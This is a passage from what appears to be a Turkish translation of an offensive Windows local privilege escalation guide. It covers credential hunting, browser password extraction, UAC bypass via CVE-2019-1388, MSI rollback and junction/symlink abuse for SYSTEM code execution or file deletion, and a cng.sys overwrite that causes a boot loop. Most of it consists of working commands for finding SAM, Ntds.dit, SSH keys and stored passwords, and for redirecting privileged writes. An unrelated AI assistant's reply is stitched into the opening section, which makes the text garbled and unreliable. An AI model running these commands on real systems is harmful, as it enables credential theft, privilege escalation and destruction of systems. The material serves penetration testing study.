%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Bu ortamda doğrudan dosya sisteminize erişemem — “Search all of the proposed files” diye arama yapamam. Bana dosya içeriğini yapıştırabilir ya da hangi dosyaları aramamı istediğinizi belirtebilirsiniz.

Yerel makinenizde arama yapmak için kullanabileceğiniz bazı komutlar (bunları değiştirmeden çalıştırın):

- Tüm dosyaları listeler (git deposunda):
```
git ls-files 'src/windows-hardening/windows-local-privilege-escalation/**'
```

- Belirli bir dizindeki README.md dosyalarını bulur:
```
find src/windows-hardening/windows-local-privilege-escalation -type f -name "README.md" -print
```

- İçerik aramak için (grep):
```
grep -RIn "aranan_kelime" src/windows-hardening/windows-local-privilege-escalation
```

- Daha hızlı arama için ripgrep (rg):
```
rg "aranan_kelime" src/windows-hardening/windows-local-privilege-escalation
```

- Dizin ağacını görüntülemek için:
```
tree src/windows-hardening/windows-local-privilege-escalation
```

İsterseniz bu komutlardan birini çalıştırıp sonucu buraya yapıştırın; ben de ilgili İngilizce içeriği alıp istenen kurallara uygun olarak Türkçeye çevireyim.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Bin içinde credentials olup olmadığını da kontrol etmelisiniz

Çeşitli programlar tarafından kaydedilmiş **parolaları kurtarmak** için şu adresi kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt Defteri İçinde

**credentials içerebilecek diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

Şifrelerin **Chrome or Firefox** tarafından saklandığı dbs'leri kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin; belki bazı **şifreler** orada saklıdır.

Tarayıcılardan şifre çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, Windows işletim sistemi içinde yerleşik bir teknoloji olup farklı dillerde yazılmış yazılım bileşenleri arasında **iletişim** sağlar. Her COM bileşeni **bir class ID (CLSID) ile tanımlanır** ve her bileşen, interface ID'leri (IIDs) ile tanımlanan bir veya daha fazla arayüz üzerinden işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt defteri **HKEY\LOCAL\MACHINE\Software\Classes** ile **HKEY\CURRENT\USER\Software\Classes**'ın birleştirilmesiyle oluşturulur = **HKEY\CLASSES\ROOT.**

Bu kayıt defterinin CLSID'lerinin içinde, bir **DLL**'e işaret eden bir **default value** içeren ve **ThreadingModel** adlı bir değeri barındıran çocuk kayıt defteri **InProcServer32**'yi bulabilirsiniz; bu değer **Apartment** (Tek İş parçacıklı), **Free** (Çok İş parçacıklı), **Both** (Tek veya Çok) veya **Neutral** (İş parçacığına nötr) olabilir.

![](<../../images/image (729).png>)

Temelde, çalıştırılacak herhangi bir **overwrite any of the DLLs** üzerine yazabiliyorsanız, o DLL farklı bir kullanıcı tarafından çalıştırıldığında **escalate privileges** elde edebilirsiniz.

Saldırganların COM Hijacking'i persistence mekanizması olarak nasıl kullandığını öğrenmek için bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel şifre araması**

**Dosya içeriklerinde ara**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip dosyayı ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt Defteri'nde anahtar adları ve parolaları ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf için bir** plugin. Bu plugin'i, hedef içinde **credentials arayan her metasploit POST module'unu otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parolaları çıkarmak için başka harika bir araçtır.

Araç [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher), bu verileri açık metin olarak saklayan (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) çeşitli araçların **sessions**, **usernames** ve **passwords**'larını arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Bu örneği, bu zafiyeti nasıl tespit edip sömürebileceğiniz hakkında daha fazla bilgi için okuyun.](leaked-handle-exploitation.md)\
[Bu diğer yazı, farklı izin seviyeleriyle devredilen process ve thread open handler'larını (sadece full access değil) test etmek ve kötüye kullanmak hakkında daha kapsamlı bir açıklama sunuyor.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

Paylaşılan bellek segmentleri, **pipes** olarak anılan yapılar, process'ler arası iletişim ve veri transferine olanak tanır.

Windows, ilgisiz process'lerin bile farklı ağlar üzerinden veri paylaşmasına izin veren **Named Pipes** adında bir özellik sunar. Bu yapı client/server mimarisine benzer; roller **named pipe server** ve **named pipe client** olarak tanımlanır.

Bir **client** tarafından pipe üzerinden veri gönderildiğinde, pipe'ı açan **server**, gerekli **SeImpersonate** haklarına sahipse **client**'ın kimliğini üstlenme yeteneğine sahiptir. Pipe üzerinden iletişim kuran ve taklit edebileceğiniz bir **ayrıcalıklı process** tespit etmek, sizin kurduğunuz pipe ile etkileşime girdiğinde o process'in kimliğini üstlenerek **daha yüksek ayrıcalıklar elde etme** fırsatı sağlar. Bu tür bir saldırının nasıl gerçekleştirileceğiyle ilgili rehberler için şunlara bakın: [**buraya**](named-pipe-client-impersonation.md) ve [**buraya**](#from-high-integrity-to-system).

Ayrıca aşağıdaki araç, burp gibi bir araçla named pipe iletişimini **intercept** etmenizi sağlar: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç da tüm pipe'ları listeleyip görüntüleyerek privesc'leri bulmanıza yardımcı olur:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Sayfaya bakın: **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Komut Satırlarını İzleme**

Kullanıcı olarak bir shell elde ettiğinizde, komut satırında **kimlik bilgilerini (credentials) geçiren** zamanlanmış görevler veya başka process'ler çalışıyor olabilir. Aşağıdaki script, process komut satırlarını her iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktı olarak verir.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Proseslerden şifre çalma

## Düşük Ayrıcalıklı Kullanıcıdan NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Grafik arayüze (via console or RDP) erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde yetkisiz bir kullanıcıdan "NT\AUTHORITY SYSTEM" gibi bir terminali veya başka herhangi bir süreci çalıştırmak mümkündür.

Bu, aynı güvenlik açığı ile ayrıcalıkları yükseltmeyi ve UAC'yi atlamayı aynı anda mümkün kılar. Ayrıca, süreç sırasında herhangi bir şey yüklemeye gerek yoktur ve kullanılan binary imzalıdır ve Microsoft tarafından yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu açığı istismar etmek için aşağıdaki adımları gerçekleştirmeniz gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Bunun için **Integrity Levels** hakkında bilgi edinmek için şunu oku:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'larını** öğrenmek için şunu oku:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Bu teknik, [**bu blog yazısı**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) tarafından açıklanmıştır ve exploit kodu [**burada mevcut**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Saldırı temelde Windows Installer'ın rollback özelliğini kötüye kullanarak uninstallation sırasında meşru dosyaların yerine kötü amaçlı dosyalar koymaya dayanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek amacıyla kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir; Windows Installer daha sonra diğer MSI paketlerinin uninstall işlemlerinde rollback dosyalarını buraya yazar ve bu rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilir.

Tekniğin özeti şu şekildedir:

1. **Aşama 1 – Hijack için Hazırlık (boş bırak `C:\Config.Msi`)**

- Adım 1: MSI'yı kur
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) kuran bir `.msi` oluştur.
- Installer'ı **"UAC Compliant"** olarak işaretle, böylece **non-admin user** çalıştırabilir.
- Kurulumdan sonra dosyaya bir **handle** açık tut.

- Adım 2: Uninstall'ı başlat
- Aynı `.msi`'yı uninstall et.
- Uninstall süreci dosyaları `C:\Config.Msi`'ye taşımaya ve onları `.rbf` dosyalarına yeniden adlandırmaya başlar (rollback yedekleri).
- Dosya açık handle'ını `GetFinalPathNameByHandle` ile **poll** ederek dosyanın ne zaman `C:\Config.Msi\<random>.rbf` haline geldiğini tespit et.

- Adım 3: Özel Senkronizasyon
- `.msi` içinde `.rbf` yazıldığında sinyal veren bir **custom uninstall action (`SyncOnRbfWritten`)** bulunur.
- Bu action:
  - `.rbf` yazıldığında sinyal verir.
  - Sonra uninstall işlemine devam etmeden önce başka bir event üzerinde **bekler**.

- Adım 4: `.rbf` Silinmesini Engelle
- Sinyal alındığında, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **aç** — bu, dosyanın silinmesini **engeller**.
- Sonra uninstall'ın bitmesi için **geri sinyal ver**.
- Windows Installer `.rbf`'yi silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf`'yi Manuel Sil
- Sen (saldırgan) `.rbf` dosyasını manuel olarak sil.
- Şimdi **`C:\Config.Msi` boş** ve ele geçirilmeye hazır.

> Bu noktada, `C:\Config.Msi`'yi silmek için **SYSTEM-level arbitrary folder delete** zafiyetini tetikle.

2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**

- Adım 6: Zayıf ACL'lerle `C:\Config.Msi`'yi Yeniden Oluştur
- `C:\Config.Msi` klasörünü kendin yeniden oluştur.
- **Zayıf DACL'ler** (ör. Everyone:F) ayarla ve `WRITE_DAC` ile bir handle açık tut.

- Adım 7: Başka Bir Kurulum Çalıştır
- `.msi`'yı tekrar kur, şu ayarlarla:
  - `TARGETDIR`: Yazılabilir konum.
  - `ERROROUT`: zorla başarısızlığı tetikleyen bir değişken.
- Bu kurulum rollback'i tekrar tetiklemek için kullanılacak; rollback `.rbs` ve `.rbf` okur.

- Adım 8: `.rbs`'yi İzle
- `ReadDirectoryChangesW` kullanarak `C:\Config.Msi`'yi yeni bir `.rbs` görünene kadar izle.
- Dosya adını yakala.

- Adım 9: Rollback Öncesi Senkronizasyon
- `.msi` içinde bir **custom install action (`SyncBeforeRollback`)** vardır:
  - `.rbs` oluşturulduğunda bir event sinyali gönderir.
  - Sonra devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'leri Tekrar Uygula
- `.rbs oluşturuldu` event'ini aldıktan sonra:
  - Windows Installer `C:\Config.Msi`'ye **güçlü ACL'ler** yeniden uygular.
  - Ancak sen hâlâ `WRITE_DAC` ile bir handle açık tuttuğun için **zayıf ACL'leri tekrar uygulayabilirsin**.

> ACL'ler **sadece handle açıldığında enforce edilir**, bu yüzden hâlâ klasöre yazabiliyorsun.

- Adım 11: Sahte `.rbs` ve `.rbf` Bırak
- `.rbs` dosyasını, Windows'a şunu söyleyen **sahte bir rollback script** ile overwrite et:
  - `.rbf` dosyanı (kötü amaçlı DLL) bir **privileged konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemesini söyle.
- Kötü amaçlı SYSTEM-level payload DLL'ini içeren sahte `.rbf`'ni bırak.

- Adım 12: Rollback'i Tetikle
- Installer'ın devam etmesi için sync event'ini sinyal et.
- Bilinen bir noktada kurulumu **kasıtlı olarak başarısız kılmak** üzere yapılandırılmış bir **type 19 custom action (`ErrorOut`)** vardır.
- Bu rollback'in başlamasına neden olur.

- Adım 13: SYSTEM Senin DLL'ini Kurar
- Windows Installer:
  - Kötü amaçlı `.rbs`'ini okur.
  - `.rbf` DLL'ini hedef konuma kopyalar.
- Artık **kötü amaçlı DLL'in SYSTEM yüklenen bir yolda**.

- Son Adım: SYSTEM Kodunu Çalıştır
- Kötü amaçlı DLL'in yüklendiği yolu çağıran güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştır.
- **Boom**: Kodun **SYSTEM** olarak çalışır.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Ana MSI rollback tekniği (öncekiler) bir **tüm klasörü** (ör. `C:\Config.Msi`) silebildiğin varsayar. Ama ya zafiyetin sadece **rastgele dosya silme** izin veriyorsa?

NTFS iç yapısını sömürebilirsin: her klasörün gizli bir alternate data stream'i vardır, adı:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream klasörün **dizin meta verilerini** depolar.

Yani, eğer **bir klasörün `::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS dosya sisteminden **tüm klasörü kaldırır**.

Bunu şu gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *dosya* silme API'sini çağırıyor olsanız bile, bu **klasörün kendisini siler**.

### Klasör İçeriğinin Silinmesinden SYSTEM EoP'ye
Eğer primitive’in rastgele dosya/klasörleri silmene izin vermiyorsa, ancak **attacker-controlled folder'ın *contents*'ını silmene izin veriyorsa** ne olur?

1. Adım 1: Tuzak bir klasör ve dosya hazırlayın
- Oluşturun: `C:\temp\folder1`
- İçinde: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerinde bir **oplock** yerleştirin
- Oplock, yetkili bir süreç `file1.txt`'i silmeye çalıştığında yürütmeyi **duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM process'ini tetikleyin (örn., `SilentCleanup`)
- Bu process klasörleri (örn., `%TEMP%`) tarar ve içindekileri silmeye çalışır.
- `file1.txt`'e ulaştığında, **oplock triggers** tetiklenir ve kontrol callback'inize verilir.

4. Adım 4: oplock callback içinde – silmeyi yönlendir

- Option A: Move `file1.txt` elsewhere
- Bu, `folder1`'i oplock'u bozmadan boşaltır.
- `file1.txt`'i doğrudan silmeyin — bu oplock'u erken serbest bırakır.

- Option B: Convert `folder1` into a **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS iç akışını hedef alır — onu silmek klasörü siler.

5. Adım 5: Oplock'un serbest bırakılması
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle, aslında şu anda siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### From Arbitrary Folder Create to Permanent DoS

Bir primitive'yi istismar ederek **create an arbitrary folder as SYSTEM/admin** oluşturmanızı sağlayan bir zafiyeti kullanın — hatta **dosya yazamıyorsanız** veya **zayıf izinler atayamıyorsanız**.

Adı bir **kritik Windows sürücüsü** olan bir **klasör** (dosya değil) oluşturun, örn.:
```
C:\Windows\System32\cng.sys
```
- Bu yol genellikle `cng.sys` kernel-mod sürücüsüne karşılık gelir.
- Eğer bunu bir klasör olarak **önceden oluşturursanız**, Windows önyüklemede gerçek sürücüyü yükleyemez.
- Ardından, Windows önyükleme sırasında `cng.sys`'i yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü çözemez**, ve **çöker veya önyüklemeyi durdurur**.
- Harici müdahale olmadan (ör. önyükleme onarımı veya disk erişimi) **geri dönüş yok**, ve **kurtarma yok**.

### Privileged log/backup paths + OM symlinks ile arbitrary file overwrite / boot DoS'a

Bir **privileged service**, bir **writable config**'ten okunan bir yola loglar/exports yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile yönlendirerek privileged write'i arbitrary overwrite'a dönüştürebilirsiniz (hatta **SeCreateSymbolicLinkPrivilege** olmadan bile).

**Requirements**
- Hedef yolu saklayan config, saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM file symlink oluşturabilme yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Bu yola yazan bir privileged operation (log, export, report).

**Example chain**
1. Privileged log hedefini kurtarmak için config'i okuyun, ör. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` satırı `C:\ProgramData\ICONICS\IcoSetup64.ini` içinde.
2. Admin olmadan yolu yeniden yönlendir:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Yetkili bileşenin logu yazmasını bekleyin (ör. admin "send test SMS" tetikler). Yazma artık `C:\Windows\System32\cng.sys` konumuna yapılıyor.
4. Üzerine yazılmış hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma Windows'un tahrif edilmiş sürücü yolunu yüklemesini zorlar → **boot loop DoS**. Bu, ayrıcalıklı bir servis tarafından yazma için açılacak herhangi bir korumalı dosyaya da genelleştirilebilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys`'den yüklenir, ancak `C:\Windows\System32\cng.sys` içinde bir kopya varsa önce bu denenebilir; bu da bozuk veri için güvenilir bir DoS havuzu yapar.



## **High Integrity'den SYSTEM'e**

### **Yeni servis**

Zaten bir High Integrity işlemi üzerinde çalışıyorsanız, **SYSTEM'e giden yol** sadece **yeni bir servis oluşturup çalıştırmak** kadar kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken geçerli bir service olduğundan veya binary'nin gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20s içinde sonlandırılacaktır.

### AlwaysInstallElevated

High Integrity bir process'ten **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
[İlgili registry anahtarları ve _.msi_ paketinin nasıl kurulacağı hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Şunu yapabilirsiniz** [**kodu burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen bunu zaten bir High Integrity process içinde bulacaksınız), SeDebug ayrıcalığı ile **neredeyse herhangi bir process'i açabilir** (korunmuş processler değil), process'in **token'ını kopyalayabilir** ve o token ile **istediğiniz bir process oluşturabilirsiniz**.\
Bu teknik kullanılırken genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan herhangi bir process seçilir** (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Bir örneğini** [**önerilen tekniği uygulayan kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik meterpreter tarafından getsystem için kullanılır. Teknik, **bir pipe oluşturup sonra o pipe'a yazmak için bir service oluşturmak/istismar etmek**ten oluşur. Ardından, **pipe'ı oluşturan server** `SeImpersonate` ayrıcalığını kullanarak pipe istemcisinin (servisin) **token'ını taklit edebilecek** ve SYSTEM ayrıcalıkları elde edecektir.\
Eğer named pipes hakkında daha fazla bilgi edinmek istiyorsanız [**bunu okuyun**](#named-pipe-client-impersonation).\
Eğer high integrity'den System'a named pipes kullanarak nasıl geçileceğine dair bir örnek okumak istiyorsanız [**bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer SYSTEM olarak çalışan bir process tarafından yüklenen bir dll'i **hijack etmeyi** başarırsanız, bu izinlerle rastgele kod çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür ayrıcalık yükseltmeleri için de faydalıdır ve ayrıca, dll'lerin yüklendiği klasörlerde **yazma izinlerine** sahip olacağı için high integrity bir process'ten **elde edilmesi çok daha kolaydır**.\
**Daha fazla bilgi edinmek için Dll hijacking hakkında [**buradan**](dll-hijacking/index.html) okuyabilirsiniz**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Faydalı araçlar

**Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bak**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bak**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Yerelde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray yapar**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows keşfi**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Yönetici hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Host üzerinde yanlış yapılandırmaları arar (daha çok bilgi toplama aracı, privesc'ten ziyade) (derlenmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
